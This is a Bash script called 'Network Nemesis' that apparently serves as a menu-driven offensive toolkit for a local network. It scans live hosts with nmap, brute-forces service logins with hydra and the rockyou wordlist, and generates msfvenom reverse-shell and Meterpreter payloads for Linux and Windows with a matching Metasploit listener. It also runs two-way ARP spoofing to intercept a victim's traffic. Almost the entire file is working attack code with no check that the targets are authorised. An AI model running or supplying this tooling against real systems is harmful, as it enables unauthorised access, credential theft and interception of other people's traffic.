#!/bin/bash

# Define color codes for script output
BLUE="\e[34m"
PURPLE="\e[35m"
RESET="\e[0m"

# Function to check if the script is running as root and check for the needed tools
function CHECK () {
	echo
	echo -e "${PURPLE}[*] Function (1) CHECK${RESET}"

	# Ensure the script is run as root
	if [ "$(whoami)" != "root" ]; then
		echo -e "Must be ${BLUE}root${RESET} to run, exiting now..."
		exit
	else
		echo -e "You are ${BLUE}root${RESET}, continuing..."
	fi
	
	# Function to check if a package is installed
	CHECK-PACKAGE () {
		dpkg -l | grep -qw "$1"
        return $?
	}

	# List of required tools
	tools="dsniff hydra metasploit-framework tmux"

	# Loop through each tool to check if installed, otherwise it installs it
	for i in $tools; do 
		if CHECK-PACKAGE $i; then
			echo -e "${BLUE}$i${RESET} is installed"
		else 
			echo "Installing $i..."
			sudo apt-get install $i
		fi
		sleep 1  
	done
}

# Function to scan and display live IPs on the network
function UP () {
	# Get the network range from the routing table
	RANGE=$(ip route | grep kernel | awk '{print $1}')
	
	echo
    echo -e "${PURPLE}[*] Function (2) UP${RESET}"
    echo "Displaying available IP addresses on the network"

    # Use nmap to detect live hosts and display them
    echo -e "${BLUE}$(nmap -sn $RANGE | grep "Nmap scan report" | awk '{print $(NF)}')${RESET}"
}

function DIR () {
	echo
	echo -e "${PURPLE}[*] Function (3) DIR${RESET}"

	# Loop to ensure a valid directory name is chosen
	while true; do
        # Prompt user to enter a directory name
        read -p "[?] Please enter the name of the directory you wish to create. All results will be saved in this directory: " OUT_DIR
        
        # Confirm directory name choice
        read -p "[?] You have chosen the name '$OUT_DIR'. Is this input correct? (y/n): " ANS
        
        # If user confirms the choice
        if [[ $ANS == "y" || $ANS == "Y" ]]; then
            # Check if directory already exists
            if [[ -d "$OUT_DIR" ]]; then
                echo "[-] Directory '$OUT_DIR' already exists. Please choose another name."
            else
                # Create the directory and navigate into it
                echo -e "[*] Creating the directory ${BLUE}$OUT_DIR${RESET}"
                mkdir "$OUT_DIR"
                cd "$OUT_DIR"
                break  
            fi
        
        # If user rejects the choice, prompt them again
        elif [[ $ANS == "n" || $ANS == "N" ]]; then
            echo "[-] Input is incorrect. Please try again."
        
        # Handle invalid inputs
        else
            echo "[-] Invalid answer. Please type 'y' or 'n'."
        fi
    done
}

function BRUTE () {
    
    # Function to perform brute-force attack using Hydra
    function HYDRA () {
        
        # Loop to prompt user for an IP address to brute force
        while true; do
            read -p "Please choose an IP you wish to brute force using hydra: " IP
            
            # Check if the provided IP is up using Nmap
            if nmap -sn "$IP" | grep -q "Host is up"; then
                
                # List open ports for the chosen IP
                nmap "$IP" | grep open | awk '{print $(NF)}' > open_ports
                
                echo "Displaying the open ports in the chosen IP:"
                echo -e "${BLUE}$(nmap $IP | grep open | awk '{print $(NF)}')${RESET}"
                
                break  # Exit loop if IP is valid
            else
                echo -e "The IP ${BLUE}$IP${RESET} is not up."
            fi
        done

        # Loop to prompt user for a service to brute force
        while true; do
            read -p "Please choose a service you wish to brute force: " ANSWER
            
            # Validate if the chosen service is among the open ports
            if ! grep -qF "$ANSWER" ./open_ports; then
                echo -e "The service ${BLUE}$ANSWER${RESET} is not open."
            else
                echo -e "Commencing a brute-force attack on ${BLUE}$ANSWER${RESET} for ${BLUE}$IP${RESET}"
                break  # Exit loop if service is valid
            fi
        done

        # Loop to choose between user-provided or default wordlists
        while true; do
            echo "Please choose a password and user list from the following options: "
            echo "1) User input password list & user input user list"
            echo "2) Generated password list & generated user list"
            read -p "Select an option (1 or 2): " OPTION

            case $OPTION in
                1)
                    # User provides custom password and user lists
                    read -p "[?] Please enter the full path of the password list you wish to use: " PASSLIST
                    read -p "[?] Please enter the full path of the user list you wish to use: " USERLIST
                    
                    # Perform brute-force attack using Hydra
                    hydra -L "$USERLIST" -P "$PASSLIST" "$IP" "$ANSWER" -o "brute_${IP}_${ANSWER}.txt" > /dev/null 2>&1

                    # Check if valid credentials were found
                    if grep -qi "host:" "brute_${IP}_${ANSWER}.txt"; then
                        echo -e "${BLUE}[+] Found credentials for $IP on $ANSWER:${RESET}"
                        echo -e "${BLUE}$(grep "host:" "brute_${IP}_${ANSWER}.txt")${RESET}"
                    else
                        echo "[-] No valid credentials found for $IP on $ANSWER"
                    fi
                    break  # Exit loop after attack
                    ;;

                2)
                    # Use default rockyou.txt wordlist
                    gunzip /usr/share/wordlists/rockyou.txt.gz
                    ROCKYOU="/usr/share/wordlists/rockyou.txt"

                    # Perform brute-force attack using Hydra
                    hydra -L "$ROCKYOU" -P "$ROCKYOU" "$IP" "$ANSWER" -o "brute_${IP}_${ANSWER}.txt" > /dev/null 2>&1

                    # Check if valid credentials were found
                    if grep -qi "host:" "brute_${IP}_${ANSWER}.txt"; then
                        echo -e "${BLUE}[+] Found credentials for $IP on $ANSWER:${RESET}"
                        echo -e "${BLUE}$(grep "host:" "brute_${IP}_${ANSWER}.txt")${RESET}"
                    else
                        echo "[-] No valid credentials found for $IP on $ANSWER"
                    fi
                    break  # Exit loop after attack
                    ;;

                *)
                    echo "Invalid option selected. Please try again."
                    ;;
            esac
        done

        # Log brute-force attempt in system logs
        echo "$(date '+%Y-%m-%d %H:%M:%S') - Attack: Metasploit Exploit, Target: $IP" >> /var/log/brute_force_log.txt

        # Loop to ask if the user wants to launch another attack
        while true; do
            read -p "[?] Would you like to choose another attack? (y/n) " CHOICE
            
            if [[ "$CHOICE" == "y" || "$CHOICE" == "Y" ]]; then
                MENU  # Return to main menu
            elif [[ "$CHOICE" == "n" || "$CHOICE" == "N" ]]; then
                exit  # Exit script
            else
                echo "[-] Invalid option, Please choose (y/n) "
            fi
        done

        # Remove temporary file containing open ports
        rm open_ports
    }

    # Execute the Hydra brute-force function
    HYDRA

    # Loop to ask if the user wants to brute force another IP or service
    while true; do
        read -p "[?] Would you like to choose another IP or service? (y/n): " ANSWER
        
        if [[ $ANSWER == "y" || $ANSWER == "Y" ]]; then
            HYDRA  # Restart the HYDRA function
        elif [[ $ANSWER == "n" || $ANSWER == "N" ]]; then
            echo "[*] Continuing..."
            break  # Exit loop if user chooses not to continue
        else
            echo "[!] Invalid input. Please enter 'y' or 'n'."
        fi
    done
}

function METASPLOIT () {

    # Get the attacker's IP address
    ATTACKER_IP=$(ifconfig | head -n 2 | tail -n 1 | awk '{print $2}')

    # Loop to prompt the user for payload type (Linux or Windows)
    while true; do
        read -p "[?] Please enter (1) to create a Linux-based payload or (2) for a Windows-based payload: " CHOICE

        if [[ "$CHOICE" == "1" ]]; then
            echo -e "[*] Creating a ${BLUE}Linux${RESET} based payload using msfvenom..."

            # Loop to ensure the user enters a valid 4-digit port number
            while true; do
                read -p "[?] Enter a 4-digit port number for your payload: " NUMBER
                if [[ "$NUMBER" =~ ^[0-9]{4}$ ]]; then
                    echo -e "[*] Creating a payload using port ${BLUE}$NUMBER${RESET}"
                    break  # Exit loop if valid
                else
                    echo "[-] Invalid input. Please enter exactly 4 digits."
                fi
            done

            # Loop to choose the payload type (Reverse shell or Meterpreter)
            while true; do
                read -p "[?] Please enter (1) to create a regular reverse shell payload or (2) for a Meterpreter payload: " PAYLOAD

                if [[ "$PAYLOAD" == "1" ]]; then 
                    echo -e "[*] Creating a ${BLUE}linux/x64/shell_reverse_tcp${RESET} payload"
                    PL="linux/x64/shell_reverse_tcp"
                    read -p "[?] Please enter the name of your payload: " NAME  
                    msfvenom -p linux/x64/shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT="$NUMBER" -f elf -o "${NAME}.elf" 2>/dev/null
                    echo -e "[*] Created ${BLUE}${NAME}.elf${RESET} payload"
                    break  

                elif [[ "$PAYLOAD" == "2" ]]; then
                    echo -e "[*] Creating a ${BLUE}linux/x64/meterpreter/reverse_tcp${RESET} payload"
                    PL="linux/x64/meterpreter/reverse_tcp"
                    read -p "[?] Please enter the name of your payload: " NAME
                    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$ATTACKER_IP" LPORT="$NUMBER" -f elf -o "${NAME}.elf" 2>/dev/null
                    echo -e "[*] Created ${BLUE}${NAME}.elf${RESET} payload"
                    break  

                else
                    echo "[-] Invalid option, please choose 1 or 2."
                fi
            done
            break  

        elif [[ "$CHOICE" == "2" ]]; then
            echo -e "[*] Creating a ${BLUE}Windows${RESET} based payload using msfvenom..."

            # Loop to ensure the user enters a valid 4-digit port number
            while true; do
                read -p "[?] Enter a 4-digit port number for your payload: " NUMBER
                if [[ "$NUMBER" =~ ^[0-9]{4}$ ]]; then
                    echo -e "[*] Creating a payload using port ${BLUE}$NUMBER${RESET}"
                    break 
                else
                    echo "[-] Invalid input. Please enter exactly 4 digits."
                fi
            done

            # Loop to choose the payload type (Reverse shell or Meterpreter)
            while true; do
                read -p "[?] Please enter (1) to create a regular reverse shell payload or (2) for a Meterpreter payload: " PAYLOAD

                if [[ "$PAYLOAD" == "1" ]]; then 
                    echo -e "[*] Creating a ${BLUE}windows/shell_reverse_tcp${RESET} payload"
                    PL="windows/shell_reverse_tcp"
                    read -p "[?] Please enter the name of your payload: " NAME  
                    msfvenom -p windows/shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT="$NUMBER" -f exe -o "${NAME}.exe" 2>/dev/null
                    echo -e "[*] Created ${BLUE}${NAME}.exe${RESET} payload"
                    break  

                elif [[ "$PAYLOAD" == "2" ]]; then
                    echo -e "[*] Creating a ${BLUE}windows/meterpreter/reverse_tcp${RESET} payload"
                    PL="windows/meterpreter/reverse_tcp"
                    read -p "[?] Please enter the name of your payload: " NAME
                    msfvenom -p windows/meterpreter/reverse_tcp LHOST="$ATTACKER_IP" LPORT="$NUMBER" -f exe -o "${NAME}.exe" 2>/dev/null
                    echo -e "[*] Created ${BLUE}${NAME}.exe${RESET} payload"
                    break  

                else
                    echo "[-] Invalid option, please choose 1 or 2."
                fi
            done
            break  

        else
            echo "[-] Invalid option, please choose 1 or 2."
        fi
    done

    # Prompt the user to transfer the payload before continuing
    read -p "[*] Please transfer the payload to the target and press Enter to continue: " CONTINUE

    # Function to start a Metasploit listener in a tmux session
    function LISTENER () {
        read -p "[?] Please enter the session name for the msfconsole listener: " SESSION
        tmux new-session -d -s "$SESSION" "msfconsole -x 'use exploit/multi/handler; set payload $PL; set LHOST $ATTACKER_IP; set LPORT $NUMBER; exploit; exec bash'"
        echo -e "[*] You can reattach to it using: ${BLUE}sudo tmux attach -t $SESSION${BLUE}"
        echo -e "[!] Please note you must re-attach the session as ${BLUE}root!${RESET} (Using the sudo command of sudo su)"
        
        read -p "[*] Once you finish with your msfconsole exploit, press Enter to continue: " CONTINUE
        
        # Prompt user to enter the target IP for logging purposes
        while true; do
            read -p "[?] Please enter the target IP address for logging purposes: " TARGET
            if ping -c 1 -W 1 "$TARGET" &> /dev/null; then
                echo "Valid IP: $TARGET"
                break  
            else
                echo "[-] Invalid IP address. Please try again."
            fi
        done
        
        # Log the attack details
        echo "$(date '+%Y-%m-%d %H:%M:%S') - Attack: Metasploit Exploit, Target: $TARGET" >> /var/log/metasploit_log.txt

        # Ask if the user wants to choose another attack
        while true; do
            read -p "[?] Would you like to choose another attack? (y/n) " CHOICE
            if [[ "$CHOICE" == "y" || "$CHOICE" == "Y" ]]; then
                MENU
            elif [[ "$CHOICE" == "n" || "$CHOICE" == "N" ]]; then
                exit
            else
                echo "[-] Invalid option, Please choose (y/n) "
            fi
        done
    }

    # Prompt user if they want to start the Metasploit listener
    while true; do
        read -p "[?] Would you like to start a listener using msfconsole? (y/n) " CHOICE
        if [[ "$CHOICE" == "y" || "$CHOICE" == "Y" ]]; then
            LISTENER
            break
        elif [[ "$CHOICE" == "n" || "$CHOICE" == "N" ]]; then
            break
        else
            echo "[-] Invalid option, Please choose (y/n) "
        fi
    done
}

function ARPSPOOF() {
	
    function ARP () {
        # Get the network interface and gateway IP
        INTERFACE=$(ip route | grep default | awk '{print $5}')
        GATEWAY=$(ip route | grep default | awk '{print $3}')

        # Loop to prompt the user for the target IP address
        while true; do
            read -p "[?] Please enter target IP address: " TARGET

            # Check if the target IP is reachable
            if ping -c 1 -W 1 "$TARGET" &> /dev/null; then
                echo "Valid IP: $TARGET"
                break  
            else
                echo "Invalid IP address. Please try again."
            fi
        done

        # Display selected network settings
        echo -e "[*] The interface is ${BLUE}$INTERFACE${RESET}"
        echo -e "[*] The target IP is ${BLUE}$TARGET${RESET}"
        echo -e "[*] The gateway IP is ${BLUE}$GATEWAY${RESET}"

        # Enable IP forwarding to allow packet forwarding between networks
        echo "[+] Enabling IP forwarding..."
        echo 1 > /proc/sys/net/ipv4/ip_forward

        # Start ARP spoofing attack
        echo "[+] Starting ARP spoofing..."
        
        # Open two xterm windows running arpspoof, targeting the victim and gateway
        xterm -hold -e "arpspoof -i $INTERFACE -t $TARGET $GATEWAY" &
        PID1=$!  
        xterm -hold -e "arpspoof -i $INTERFACE -t $GATEWAY $TARGET" &
        PID2=$!  

        echo "[+] ARP spoofing started!"

        # Wait for user input to stop the attack
        read -p "Press Enter to stop ARP spoofing..."

        # Stop ARP spoofing by killing the background processes
        echo "[+] Stopping ARP spoofing..."
        kill $PID1
        kill $PID2

        echo "[+] ARP spoofing stopped."

        # Log the attack details
        echo "$(date '+%Y-%m-%d %H:%M:%S') - Attack: ARP Spoofing, Target: $TARGET" >> /var/log/arp_spoof_log.txt
    }

    # Display a note about ARP spoofing limitations
    echo "[*] Please note that ARP spoofing can only work if your device is in the same network as the target."

    # Prompt the user to start ARP spoofing
    while true; do
        read -p "[?] Would you like to commence ARP spoofing? (y/n) " CHOICE

        if [[ "$CHOICE" == "y" || "$CHOICE" == "Y" ]]; then
            ARP
            break
        elif [[ "$CHOICE" == "n" || "$CHOICE" == "N" ]]; then
            echo "[*] Returning to main menu"
            MENU
            break
        else
            echo "[-] Invalid option, Please choose (y/n) "
        fi
    done

    # Prompt the user if they want to launch another attack
    while true; do
        read -p "[?] Would you like to choose another attack? (y/n) " CHOICE

        if [[ "$CHOICE" == "y" || "$CHOICE" == "Y" ]]; then
            MENU
        elif [[ "$CHOICE" == "n" || "$CHOICE" == "N" ]]; then
            exit
        else
            echo "[-] Invalid option, Please choose (y/n) "
        fi
    done
}

CHECK
UP
DIR

function MENU () {
    echo
    echo -e "${PURPLE}[*] Function (3) MENU${RESET}"

    # Display the welcome message
    echo -e "[*] Welcome to ${PURPLE}Network Nemesis!${RESET}"

    # Loop to continuously display menu options until an attack is selected
    while true; do
        echo "[*] Here are the attacks the creator has prepared for you:"
        echo -e "1) ${BLUE}Brute Force${RESET}: Attempts to gain unauthorized access by systematically trying all possible passwords until the correct one is found."
        echo -e "2) ${BLUE}ARP Spoofing${RESET}: Intercepts network traffic by associating the attacker's MAC address with the IP address of a legitimate device, enabling a Man-in-the-Middle (MITM) attack."
        echo -e "3) ${BLUE}Metasploit Exploit${RESET}: Uses the Metasploit framework to execute exploits against vulnerable targets, allowing for remote access."
        echo -e "4) ${BLUE}Randomly${RESET} chosen attack"
        echo -e "5) Exit"

        # Prompt the user for an attack selection
        read -p "[?] Please choose 1,2,3,4 or 5: " CHOICE

        # Process user input
        case $CHOICE in
            1)
                echo
                echo -e "${PURPLE}[*] Commencing BRUTE FORCE attack${RESET}"
                BRUTE
                break
                ;;
            2)
                echo
                echo -e "${PURPLE}[*] Commencing ARP SPOOFING attack${RESET}"
                ARPSPOOF
                break
                ;;
            3)
                echo
                echo -e "${PURPLE}[*] Commencing METASPLOIT attack${RESET}"
                METASPLOIT
                break
                ;;
            4)
                echo
                echo -e "${PURPLE}[*] Commencing RANDOM attack${RESET}"

                # Define the available attacks
                ATTACKS=(ARPSPOOF METASPLOIT BRUTE)
                ATTACK_NAMES=("ARP Spoofing" "Metasploit Exploit" "Brute Force")

                # Select a random attack
                RANDOM_INDEX=$(( RANDOM % ${#ATTACKS[@]} ))
                echo -e "[*] Randomly selected attack: ${PURPLE}${ATTACK_NAMES[$RANDOM_INDEX]}${RESET}"

                # Execute the randomly selected attack
                ${ATTACKS[$RANDOM_INDEX]}
                break
                ;;	
            5)
                # Exit the script
                echo "[*] Exiting..."
                exit
                ;;
            *)
                # Handle invalid input
                echo "[-] Invalid choice. Please select a valid option."
                ;;
        esac
    done
}

# Call the MENU function
MENU
